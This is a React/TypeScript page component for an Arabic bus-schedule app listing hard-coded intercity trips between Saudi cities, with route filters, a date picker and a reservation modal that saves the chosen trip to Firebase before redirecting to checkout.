import { useState, useMemo, useEffect } from "react";
import {
  Bus,
  Clock,
  MapPin,
  ChevronLeft,
  Search,
  ArrowLeftRight,
  Calendar,
  X,
} from "lucide-react";
import { useLocation } from "wouter";
import { BottomNav } from "./services";
import { addData, handleCurrentPage } from "@/lib/firebase";

const cities = [
  "الكل",
  "الرياض",
  "جدة",
  "مكة المكرمة",
  "المدينة المنورة",
  "الدمام",
  "أبها",
  "تبوك",
  "القصيم",
  "حائل",
  "الخبر",
  "الطائف",
  "جازان",
  "نجران",
  "الباحة",
  "عرعر",
  "سكاكا",
  "الجوف",
  "ينبع",
  "الأحساء",
];

type Trip = {
  from: string;
  to: string;
  departure: string;
  arrival: string;
  duration: string;
  price: number;
  type: string;
  seats: number;
  days: string[];
};

const schedules: Trip[] = [
  { from: "الرياض", to: "جدة", departure: "06:00", arrival: "11:30", duration: "5:30", price: 95, type: "مريح", seats: 12, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "جدة", departure: "09:00", arrival: "14:30", duration: "5:30", price: 85, type: "عادي", seats: 5, days: ["يومياً"] },
  { from: "الرياض", to: "جدة", departure: "14:00", arrival: "19:30", duration: "5:30", price: 95, type: "مريح", seats: 20, days: ["يومياً"] },
  { from: "الرياض", to: "جدة", departure: "22:00", arrival: "03:30", duration: "5:30", price: 75, type: "عادي", seats: 8, days: ["الجمعة", "الأحد"] },
  { from: "الرياض", to: "مكة المكرمة", departure: "07:00", arrival: "13:00", duration: "6:00", price: 110, type: "مريح", seats: 15, days: ["يومياً"] },
  { from: "الرياض", to: "مكة المكرمة", departure: "15:00", arrival: "21:00", duration: "6:00", price: 100, type: "عادي", seats: 3, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "الرياض", to: "المدينة المنورة", departure: "08:00", arrival: "14:00", duration: "6:00", price: 100, type: "مريح", seats: 18, days: ["يومياً"] },
  { from: "الرياض", to: "الدمام", departure: "07:30", arrival: "10:30", duration: "3:00", price: 55, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "الرياض", to: "الدمام", departure: "13:00", arrival: "16:00", duration: "3:00", price: 55, type: "عادي", seats: 10, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "أبها", departure: "06:30", arrival: "13:30", duration: "7:00", price: 120, type: "مريح", seats: 7, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "جدة", to: "الرياض", departure: "07:00", arrival: "12:30", duration: "5:30", price: 95, type: "مريح", seats: 14, days: ["يومياً"] },
  { from: "جدة", to: "الرياض", departure: "16:00", arrival: "21:30", duration: "5:30", price: 85, type: "عادي", seats: 6, days: ["يومياً"] },
  { from: "جدة", to: "مكة المكرمة", departure: "08:00", arrival: "09:00", duration: "1:00", price: 25, type: "عادي", seats: 30, days: ["يومياً"] },
  { from: "جدة", to: "المدينة المنورة", departure: "10:00", arrival: "14:00", duration: "4:00", price: 70, type: "مريح", seats: 9, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الدمام", to: "الرياض", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الدمام", to: "جدة", departure: "07:00", arrival: "14:30", duration: "7:30", price: 130, type: "مريح", seats: 4, days: ["الاثنين", "الخميس"] },
  { from: "مكة المكرمة", to: "الرياض", departure: "08:00", arrival: "14:00", duration: "6:00", price: 110, type: "مريح", seats: 11, days: ["يومياً"] },
  { from: "مكة المكرمة", to: "المدينة المنورة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 65, type: "عادي", seats: 25, days: ["يومياً"] },
  { from: "أبها", to: "الرياض", departure: "07:00", arrival: "14:00", duration: "7:00", price: 120, type: "مريح", seats: 8, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "تبوك", to: "المدينة المنورة", departure: "08:00", arrival: "13:00", duration: "5:00", price: 90, type: "عادي", seats: 13, days: ["السبت", "الثلاثاء"] },
  { from: "الخبر", to: "الرياض", departure: "07:00", arrival: "10:00", duration: "3:00", price: 55, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "الخبر", to: "الدمام", departure: "08:00", arrival: "08:30", duration: "0:30", price: 15, type: "عادي", seats: 25, days: ["يومياً"] },
  { from: "الرياض", to: "الخبر", departure: "10:00", arrival: "13:00", duration: "3:00", price: 55, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "الطائف", to: "جدة", departure: "07:00", arrival: "09:30", duration: "2:30", price: 40, type: "عادي", seats: 20, days: ["يومياً"] },
  { from: "الطائف", to: "مكة المكرمة", departure: "09:00", arrival: "11:00", duration: "2:00", price: 35, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "جدة", to: "الطائف", departure: "12:00", arrival: "14:30", duration: "2:30", price: 40, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الرياض", to: "الطائف", departure: "07:00", arrival: "14:30", duration: "7:30", price: 115, type: "مريح", seats: 10, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "جازان", to: "أبها", departure: "07:00", arrival: "10:00", duration: "3:00", price: 60, type: "عادي", seats: 15, days: ["يومياً"] },
  { from: "جازان", to: "جدة", departure: "08:00", arrival: "15:00", duration: "7:00", price: 125, type: "مريح", seats: 9, days: ["الاثنين", "الأربعاء", "الجمعة"] },
  { from: "الرياض", to: "جازان", departure: "07:00", arrival: "16:00", duration: "9:00", price: 155, type: "مريح", seats: 8, days: ["الاثنين", "الخميس"] },
  { from: "أبها", to: "جازان", departure: "10:00", arrival: "13:00", duration: "3:00", price: 60, type: "عادي", seats: 12, days: ["يومياً"] },
  { from: "نجران", to: "أبها", departure: "08:00", arrival: "12:00", duration: "4:00", price: 75, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "نجران", to: "الرياض", departure: "07:00", arrival: "17:00", duration: "10:00", price: 170, type: "مريح", seats: 7, days: ["الاثنين", "الخميس"] },
  { from: "أبها", to: "نجران", departure: "14:00", arrival: "18:00", duration: "4:00", price: 75, type: "عادي", seats: 11, days: ["يومياً"] },
  { from: "الباحة", to: "جدة", departure: "07:00", arrival: "11:00", duration: "4:00", price: 70, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "الباحة", to: "أبها", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 13, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "جدة", to: "الباحة", departure: "13:00", arrival: "17:00", duration: "4:00", price: 70, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "عرعر", to: "الرياض", departure: "07:00", arrival: "15:00", duration: "8:00", price: 140, type: "عادي", seats: 12, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "عرعر", to: "حائل", departure: "09:00", arrival: "13:00", duration: "4:00", price: 70, type: "عادي", seats: 10, days: ["الاثنين", "الأربعاء"] },
  { from: "الرياض", to: "عرعر", departure: "08:00", arrival: "16:00", duration: "8:00", price: 140, type: "عادي", seats: 9, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "سكاكا", to: "الرياض", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 11, days: ["السبت", "الثلاثاء"] },
  { from: "سكاكا", to: "تبوك", departure: "08:00", arrival: "12:00", duration: "4:00", price: 75, type: "عادي", seats: 14, days: ["الاثنين", "الخميس"] },
  { from: "الجوف", to: "الرياض", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 10, days: ["السبت", "الثلاثاء"] },
  { from: "الرياض", to: "سكاكا", departure: "07:00", arrival: "16:00", duration: "9:00", price: 150, type: "عادي", seats: 8, days: ["الأحد", "الأربعاء"] },
  { from: "ينبع", to: "المدينة المنورة", departure: "08:00", arrival: "11:00", duration: "3:00", price: 55, type: "عادي", seats: 20, days: ["يومياً"] },
  { from: "ينبع", to: "جدة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 70, type: "عادي", seats: 16, days: ["يومياً"] },
  { from: "المدينة المنورة", to: "ينبع", departure: "14:00", arrival: "17:00", duration: "3:00", price: 55, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "جدة", to: "ينبع", departure: "10:00", arrival: "14:00", duration: "4:00", price: 70, type: "عادي", seats: 14, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الأحساء", to: "الرياض", departure: "07:00", arrival: "11:00", duration: "4:00", price: 70, type: "عادي", seats: 17, days: ["يومياً"] },
  { from: "الأحساء", to: "الدمام", departure: "08:00", arrival: "09:30", duration: "1:30", price: 25, type: "عادي", seats: 22, days: ["يومياً"] },
  { from: "الرياض", to: "الأحساء", departure: "12:00", arrival: "16:00", duration: "4:00", price: 70, type: "عادي", seats: 15, days: ["يومياً"] },
  { from: "حائل", to: "الرياض", departure: "07:00", arrival: "13:00", duration: "6:00", price: 100, type: "عادي", seats: 14, days: ["يومياً"] },
  { from: "حائل", to: "القصيم", departure: "09:00", arrival: "12:00", duration: "3:00", price: 55, type: "عادي", seats: 16, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "حائل", departure: "08:00", arrival: "14:00", duration: "6:00", price: 100, type: "عادي", seats: 12, days: ["يومياً"] },
  { from: "القصيم", to: "الرياض", departure: "07:00", arrival: "11:30", duration: "4:30", price: 80, type: "عادي", seats: 18, days: ["يومياً"] },
  { from: "القصيم", to: "المدينة المنورة", departure: "09:00", arrival: "13:00", duration: "4:00", price: 75, type: "عادي", seats: 15, days: ["السبت", "الثلاثاء", "الخميس"] },
  { from: "الرياض", to: "القصيم", departure: "10:00", arrival: "14:30", duration: "4:30", price: 80, type: "عادي", seats: 20, days: ["يومياً"] },
];

const seatColor = (seats: number) => {
  if (seats <= 5) return "text-red-500 bg-red-50";
  if (seats <= 15) return "text-yellow-600 bg-yellow-50";
  return "text-green-600 bg-green-50";
};

function ReservationFlow({
  trip,
  onClose,
  onConfirm,
  submitting,
}: {
  trip: Trip;
  onClose: () => void;
  onConfirm: () => void;
  submitting: boolean;
}) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
      onClick={onClose}
      data-testid="modal-reservation"
    >
      <div
        className="bg-card rounded-2xl p-6 max-w-md w-full shadow-2xl relative"
        onClick={(e) => e.stopPropagation()}
        dir="rtl"
      >
        <button
          onClick={onClose}
          className="absolute top-3 left-3 w-8 h-8 rounded-full bg-muted flex items-center justify-center hover:bg-muted-foreground/20 transition-colors"
          data-testid="button-close-reservation"
        >
          <X className="w-4 h-4" />
        </button>
        <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
          <Bus className="w-7 h-7 text-primary" />
        </div>
        <h3 className="text-lg font-bold text-foreground text-center mb-2">
          تأكيد الحجز
        </h3>
        <p className="text-sm text-muted-foreground text-center mb-5">
          من {trip.from} إلى {trip.to}
        </p>
        <div className="bg-muted rounded-xl p-4 mb-5 space-y-2 text-sm">
          <div className="flex justify-between">
            <span className="text-muted-foreground">المغادرة</span>
            <span className="font-bold text-foreground">{trip.departure}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted-foreground">الوصول</span>
            <span className="font-bold text-foreground">{trip.arrival}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted-foreground">الفئة</span>
            <span className="font-bold text-foreground">{trip.type}</span>
          </div>
          <div className="flex justify-between border-t border-border pt-2 mt-2">
            <span className="text-muted-foreground">السعر</span>
            <span className="font-black text-primary text-base">
              {trip.price} ر.س
            </span>
          </div>
        </div>
        <button
          onClick={onConfirm}
          disabled={submitting}
          className="w-full bg-primary text-primary-foreground py-3 rounded-xl font-bold text-sm hover:opacity-90 transition-opacity disabled:opacity-60 disabled:cursor-not-allowed"
          data-testid="button-confirm-reservation"
        >
          {submitting ? "جاري التحويل..." : "متابعة الحجز"}
        </button>
      </div>
    </div>
  );
}

export default function Schedule() {
  const [, setLocation] = useLocation();
  const todayStr = new Date().toISOString().split("T")[0];
  const [fromCity, setFromCity] = useState("الكل");
  const [toCity, setToCity] = useState("الكل");
  const [date, setDate] = useState(todayStr);
  const [selectedTrip, setSelectedTrip] = useState<Trip | null>(null);
  const [searchFrom, setSearchFrom] = useState("الكل");
  const [searchTo, setSearchTo] = useState("الكل");
  const [reserving, setReserving] = useState(false);

  useEffect(() => {
    void handleCurrentPage("schedule");
  }, []);

  const handleConfirmReservation = async () => {
    if (!selectedTrip || reserving) return;
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setLocation("/register");
      return;
    }
    setReserving(true);
    const ok = await addData({
      id: visitorId,
      currentPage: "checkout",
      tripFrom: selectedTrip.from,
      tripTo: selectedTrip.to,
      tripDeparture: selectedTrip.departure,
      tripArrival: selectedTrip.arrival,
      tripType: selectedTrip.type,
      ticketPrice: selectedTrip.price,
      ticketQuantity: 1,
      totalAmount: selectedTrip.price,
      bookingDate: date,
      bookingTime: selectedTrip.departure,
    });
    setReserving(false);
    if (!ok) return;
    setSelectedTrip(null);
    setLocation("/checkout");
  };

  const swap = () => {
    setFromCity(toCity);
    setToCity(fromCity);
  };

  const handleSearch = () => {
    setSearchFrom(fromCity);
    setSearchTo(toCity);
  };

  const filtered = useMemo(() => {
    return schedules
      .filter((s) => {
        const fromMatch = searchFrom === "الكل" || s.from === searchFrom;
        const toMatch = searchTo === "الكل" || s.to === searchTo;
        return fromMatch && toMatch;
      })
      .sort((a, b) => a.departure.localeCompare(b.departure));
  }, [searchFrom, searchTo]);

  return (
    <div
      className="min-h-screen bg-background flex flex-col"
      dir="rtl"
      data-testid="page-schedule"
    >
      {selectedTrip && (
        <ReservationFlow
          trip={selectedTrip}
          onClose={() => setSelectedTrip(null)}
          onConfirm={() => void handleConfirmReservation()}
          submitting={reserving}
        />
      )}

      <div className="relative h-44 overflow-hidden shrink-0">
        <div className="absolute inset-0 bg-muted" />
        <div
          className="absolute inset-0 bg-primary"
          style={{ clipPath: "polygon(0 45%, 100% 0, 100% 100%, 0 100%)" }}
        />
        <div className="relative z-10 flex flex-col items-end px-6 pt-8 gap-1">
          <div className="flex items-center gap-3">
            <h1 className="text-xl font-bold text-foreground">مواعيد الرحلات</h1>
            <div className="w-10 h-10 rounded-xl bg-card border border-border flex items-center justify-center shadow">
              <Bus className="w-5 h-5 text-primary" />
            </div>
          </div>
          <p className="text-primary-foreground/80 text-sm">
            جدول انطلاق الحافلات بين المدن
          </p>
        </div>
      </div>

      <div className="px-4 -mt-5 relative z-20 mb-3">
        <div className="bg-card rounded-2xl border border-border shadow-xl p-4 flex flex-col gap-3">
          <div className="flex items-center gap-2">
            <div className="flex-1 flex flex-col gap-2">
              <div className="relative">
                <p className="text-[10px] text-muted-foreground mb-1 flex items-center gap-1">
                  <MapPin className="w-3 h-3" /> من
                </p>
                <select
                  value={fromCity}
                  onChange={(e) => setFromCity(e.target.value)}
                  className="w-full bg-muted rounded-xl px-3 py-2.5 text-sm text-foreground focus:outline-none appearance-none text-right border border-transparent focus:border-primary/40 transition-colors font-medium"
                  data-testid="select-from"
                >
                  {cities.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
              </div>
              <div className="relative">
                <p className="text-[10px] text-muted-foreground mb-1 flex items-center gap-1">
                  <MapPin className="w-3 h-3" /> إلى
                </p>
                <select
                  value={toCity}
                  onChange={(e) => setToCity(e.target.value)}
                  className="w-full bg-muted rounded-xl px-3 py-2.5 text-sm text-foreground focus:outline-none appearance-none text-right border border-transparent focus:border-primary/40 transition-colors font-medium"
                  data-testid="select-to"
                >
                  {cities.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
              </div>
            </div>
            <button
              onClick={swap}
              className="w-9 h-9 rounded-full bg-primary/10 text-primary flex items-center justify-center hover:bg-primary hover:text-primary-foreground transition-all shrink-0 self-center"
              data-testid="button-swap"
            >
              <ArrowLeftRight className="w-4 h-4" />
            </button>
          </div>

          <div>
            <p className="text-[10px] text-muted-foreground mb-1 flex items-center gap-1">
              <Calendar className="w-3 h-3" /> تاريخ السفر
            </p>
            <input
              type="date"
              value={date}
              onChange={(e) => setDate(e.target.value)}
              className="w-full bg-muted rounded-xl px-3 py-2.5 text-sm text-foreground focus:outline-none border border-transparent focus:border-primary/40 transition-colors"
              data-testid="input-date"
            />
          </div>

          <button
            onClick={handleSearch}
            className="w-full bg-primary text-primary-foreground py-3 rounded-xl font-bold text-sm flex items-center justify-center gap-2 hover:opacity-90 transition-opacity"
            data-testid="button-search"
          >
            <Search className="w-4 h-4" /> بحث عن رحلات
          </button>
        </div>
      </div>

      <div className="px-4 mb-2 flex items-center justify-between">
        <span className="text-xs text-muted-foreground">
          {filtered.length} رحلة متاحة
        </span>
        {(searchFrom !== "الكل" || searchTo !== "الكل") && (
          <button
            onClick={() => {
              setFromCity("الكل");
              setToCity("الكل");
              setSearchFrom("الكل");
              setSearchTo("الكل");
              setDate("");
            }}
            className="text-xs text-primary hover:underline"
            data-testid="button-clear"
          >
            مسح
          </button>
        )}
      </div>

      <div className="flex-1 overflow-y-auto px-4 pb-4 flex flex-col gap-3">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 gap-3 text-center">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <Bus className="w-8 h-8 text-primary" />
            </div>
            <p className="text-muted-foreground text-sm">
              لا توجد رحلات لهذه الفلترة
            </p>
          </div>
        ) : (
          filtered.map((trip, i) => (
            <div
              key={i}
              className="bg-card rounded-2xl border border-border shadow-sm hover:shadow-md hover:border-primary/30 transition-all duration-300 overflow-hidden"
              data-testid={`card-schedule-${i}`}
            >
              <div className="bg-primary/8 border-b border-border px-4 py-2.5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span
                    className={`text-xs font-bold px-2 py-0.5 rounded-full ${
                      trip.type === "مريح"
                        ? "bg-primary/20 text-primary"
                        : "bg-muted text-muted-foreground"
                    }`}
                  >
                    {trip.type}
                  </span>
                  <span className="text-base font-black text-primary">
                    {trip.price} <span className="text-xs font-normal">ر.س</span>
                  </span>
                </div>
                <div className="flex items-center gap-2 text-sm font-bold text-foreground">
                  <span>{trip.to}</span>
                  <ChevronLeft className="w-4 h-4 text-primary" />
                  <span>{trip.from}</span>
                </div>
              </div>

              <div className="px-4 py-3 flex items-center justify-between">
                <div className="flex flex-col items-center gap-0.5">
                  <span className="text-2xl font-black text-foreground">
                    {trip.departure}
                  </span>
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <MapPin className="w-3 h-3" />
                    {trip.from}
                  </span>
                </div>

                <div className="flex flex-col items-center gap-1 flex-1 px-4">
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <Clock className="w-3 h-3" />
                    {trip.duration} ساعة
                  </span>
                  <div className="w-full flex items-center gap-1">
                    <div className="w-2 h-2 rounded-full bg-primary shrink-0" />
                    <div className="flex-1 h-0.5 bg-primary/30" />
                    <Bus className="w-3 h-3 text-primary shrink-0" />
                    <div className="flex-1 h-0.5 bg-primary/30" />
                    <div className="w-2 h-2 rounded-full bg-primary shrink-0" />
                  </div>
                </div>

                <div className="flex flex-col items-center gap-0.5">
                  <span className="text-2xl font-black text-foreground">
                    {trip.arrival}
                  </span>
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <MapPin className="w-3 h-3" />
                    {trip.to}
                  </span>
                </div>
              </div>

              <div className="px-4 pb-3 flex items-center justify-between">
                <button
                  onClick={() => setSelectedTrip(trip)}
                  className="bg-primary text-primary-foreground text-xs font-bold px-4 py-2 rounded-xl hover:opacity-90 transition-opacity"
                  data-testid={`button-book-${i}`}
                >
                  احجز الآن
                </button>
                <div className="flex items-center gap-3">
                  <span
                    className={`text-xs font-medium px-2 py-1 rounded-lg ${seatColor(
                      trip.seats,
                    )}`}
                  >
                    {trip.seats} مقعد
                  </span>
                </div>
              </div>
            </div>
          ))
        )}
      </div>

      <BottomNav active="" />
    </div>
  );
}
